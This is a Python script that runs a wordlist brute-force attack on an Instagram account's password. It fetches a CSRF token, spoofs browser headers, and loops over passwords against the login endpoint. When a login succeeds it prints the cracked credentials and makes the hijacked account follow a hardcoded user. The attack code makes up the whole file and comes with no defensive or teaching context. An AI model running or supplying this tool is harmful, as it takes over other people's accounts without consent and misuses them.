import requests
import json
import time
import os

def userExists(username):
    r = requests.get('https://www.instagram.com/%s/?__a=1' % username) 
    if (r.status_code == 404):
        print ('User not found')
        return False
    elif (r.status_code == 200):
        followdata = json.loads(r.text)
        fUserID = followdata['user']['id']
        return {'username':username,'id':fUserID}


def Login(username,password):
    sess = requests.Session()
    sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
    sess.headers.update({
        'UserAgent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
        'x-instagram-ajax':'1',
        'X-Requested-With': 'XMLHttpRequest',
        'origin': 'https://www.instagram.com',
        'ContentType' : 'application/x-www-form-urlencoded',
        'Connection': 'keep-alive',
        'Accept': '*/*',
        'Referer': 'https://www.instagram.com',
        'authority': 'www.instagram.com',
        'Host' : 'www.instagram.com',
        'Accept-Language' : 'ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4',
        'Accept-Encoding' : 'gzip, deflate'
    })

    #first time -> to get csrftoken
    r = sess.get('https://www.instagram.com/') 
    sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})

    data = {'username':username, 'password':password}
    r = sess.post('https://www.instagram.com/accounts/login/ajax/', data=data, allow_redirects=True)
    token = r.cookies.get_dict()['csrftoken']
    sess.headers.update({'X-CSRFToken' : token})
    #parse response
    data = json.loads(r.text)
    if (data['status'] == 'fail'):
        print (data['message'])
        return False
    
    if (data['authenticated'] == True):
        return sess #if we want to keep use session
    else:
        print ('Password incorrect [%s]' % password)
        return False



def follow(sess, username):
    username = userExists(username)
    if (username == False):
        return  
    else:
        userID = username['id']
        followReq = sess.post('https://www.instagram.com/web/friendships/%s/follow/' % userID)
        print (followReq.text)


# Asking the user for the target username
username = str(input('Please enter a username: '))
username = userExists(username)  # Checking wheter the username entered by user actually does exists on instagram or not
if (username == False):
    # If the username entered by user does not exists, then we display the error message on the console screen

    input('[ Error : The specified username does not exists on instagram ]\nPress enter key to continue...')
    exit()
else:
    # If the username entered by the user does exists, then we continue the process

    username = username['username']

# Asking the user to enter the wordlist file location to load the password for attack
filename = input('Enter the wordlist file location : ')
if os.path.isfile(filename):
    # If the user specified wordlist file exists, then we proceed onto reading the passwords out of it

    with open(filename) as f:
        # Extracting the passwords stored in each line of the user specified wordlist file

        passwords = f.read().splitlines()
        if (len(passwords) > 0):
            # If there are passwords extracted successfully, then we display the number of passwords to be tried and then continue the process

            print('[ %s Passwords loads successfully ]' % len(passwords))
        else:
            # If there are no passwords extracted from the specified wordlist file, then we display the error on the console screen

            input('[ Error : There are no passwords extracted from the specified wordlist file, please check the file again ]\nPress enter key to continue...')
            exit()
else:
    # If the user entered wordlist file does not exist, then we display the error message on the console screen

    input('[ Error : No such file exist "{}} "]\nPress enter key to continue...'.format(filename))    
    exit()

# Asking the user for specifying the delay in trying passwords
delayLoop = int(input('Please add delay between the passwords (in seconds): ')) 

# Starting the attack
for i in range(len(passwords)):
    password = passwords[i]
    sess = Login(username,password)
    if (sess):
        print ('Login success %s' % [username,password])

        #because i am cool
        follow(sess,'avr_amit')

    try:
        time.sleep(delayLoop)
    except KeyboardInterrupt:
        an = str(input('Type y/n to exit: '))
        if (an == 'y'):
            exit()
        else:
            continue
        
